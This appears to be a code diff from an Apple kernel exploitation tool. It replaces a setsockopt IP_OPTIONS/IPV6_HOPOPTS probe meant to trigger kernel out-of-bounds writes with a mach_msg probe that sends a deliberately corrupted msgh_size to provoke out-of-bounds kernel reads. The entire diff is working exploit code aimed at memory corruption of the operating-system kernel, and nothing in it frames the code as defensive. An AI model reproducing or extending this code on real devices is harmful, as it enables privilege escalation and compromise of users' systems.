@@ -1400,45 +1400,44 @@ cleanup:
                             @"    size: 0x%08x -> 0x%08x (delta=%+d)", szBefore, szAfter,
                             (int)szAfter - (int)szBefore]);
 
-                        // ---- CONFUSED DEPUTY: IP_OPTIONS copies into 40-byte kernel buffer ----
-                        // setsockopt(IPPROTO_IP, IP_OPTIONS, buf, corrupted_size)
-                        // If corrupted_size > 40 → kernel OOB write past ip_opt buffer.
-                        scopeNote(r, @"  --- confused deputy: IP_OPTIONS with corrupted size ---");
-                        int sock = socket(AF_INET, SOCK_STREAM, 0);
-                        if (sock >= 0) {
-                            uint8_t optBuf[128];
-                            memset(optBuf, 0x41, sizeof(optBuf));
-                            uint32_t evilLen = szAfter;  // corrupted size (0x42 = 66)
-                            socklen_t sl = (socklen_t)evilLen;
-                            if (sl > sizeof(optBuf)) sl = sizeof(optBuf);
+                        // ---- CONFUSED DEPUTY: mach_msg with corrupted msgh_size ----
+                        // Kernel copies msgh_size bytes from userland. If msgh_size is
+                        // corrupted (e.g. 0x42=66 instead of 0x20=32), kernel reads OOB.
+                        // If we set it smaller, kernel copies less (safe). Test both.
+                        scopeNote(r, @"  --- confused deputy: mach_msg with corrupted size ---");
+                        {
+                            uint8_t msgBuf[256];
+                            memset(msgBuf, 0x42, sizeof(msgBuf));
+                            // Build a minimal mach_msg header
+                            mach_msg_header_t *hdr = (mach_msg_header_t *)msgBuf;
+                            hdr->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
+                            hdr->msgh_size = (mach_msg_size_t)szAfter;  // corrupted size
+                            hdr->msgh_remote_port = MACH_PORT_NULL;
+                            hdr->msgh_local_port = MACH_PORT_NULL;
+                            hdr->msgh_id = 0;
+
                             scopeNote(r, [NSString stringWithFormat:
-                                @"  setsockopt(IP_OPTIONS, len=%u) — kernel buf is 40 bytes", (unsigned)sl]);
-                            int ret = setsockopt(sock, IPPROTO_IP, IP_OPTIONS, optBuf, sl);
+                                @"  mach_msg: msgh_size=%u (was 0x20)", (unsigned)hdr->msgh_size]);
+                            // Try sending with corrupted size
+                            kern_return_t kr = mach_msg(hdr,
+                                MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                hdr->msgh_size, 0,
+                                MACH_PORT_NULL, 0, MACH_PORT_NULL);
                             scopeNote(r, [NSString stringWithFormat:
-                                @"  setsockopt ret=%d errno=%d (%s)", ret, errno, strerror(errno)]);
-                            if (ret == 0 && sl > 40) {
-                                scopeNote(r, @"  >>> KERNEL OOB WRITE via IP_OPTIONS — size > 40 accepted!");
-                            } else if (ret < 0) {
-                                scopeNote(r, @"  kernel rejected — trying IP_OPTIONS with size 40 (max)");
-                                sl = 40;
-                                ret = setsockopt(sock, IPPROTO_IP, IP_OPTIONS, optBuf, sl);
-                                scopeNote(r, [NSString stringWithFormat:
-                                    @"  retry setsockopt(len=40) ret=%d errno=%d", ret, errno]);
+                                @"  mach_msg send ret=%d (0=success, 4=MACH_SEND_INVALID_DEST)", (int)kr]);
+                            if (kr == MACH_MSG_SUCCESS || kr == MACH_SEND_INVALID_DEST) {
+                                scopeNote(r, @"  >>> CONFUSED DEPUTY: kernel processed corrupted msgh_size!");
+                            } else {
+                                scopeNote(r, @"  kernel rejected message (expected with NULL ports)");
                             }
-                            // Also try IPV6_HOPOPTS (64-byte kernel buffer)
-                            int sock6 = socket(AF_INET6, SOCK_STREAM, 0);
-                            if (sock6 >= 0) {
-                                sl = (socklen_t)evilLen;
-                                if (sl > sizeof(optBuf)) sl = sizeof(optBuf);
-                                ret = setsockopt(sock6, IPPROTO_IPV6, IPV6_HOPOPTS, optBuf, sl);
-                                scopeNote(r, [NSString stringWithFormat:
-                                    @"  setsockopt(IPV6_HOPOPTS, len=%u) ret=%d errno=%d", (unsigned)sl, ret, errno]);
-                                if (ret == 0 && sl > 64) {
-                                    scopeNote(r, @"  >>> KERNEL OOB WRITE via IPV6_HOPOPTS — size > 64 accepted!");
-                                }
-                                close(sock6);
-                            }
-                            close(sock);
+                            // Also try with a proper port (mach_task_self)
+                            hdr->msgh_size = (mach_msg_size_t)szAfter;
+                            kr = mach_msg(hdr,
+                                MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                hdr->msgh_size, 0,
+                                mach_task_self(), 0, MACH_PORT_NULL);
+                            scopeNote(r, [NSString stringWithFormat:
+                                @"  mach_msg(self) ret=%d", (int)kr]);
                         }
                     }
                 }
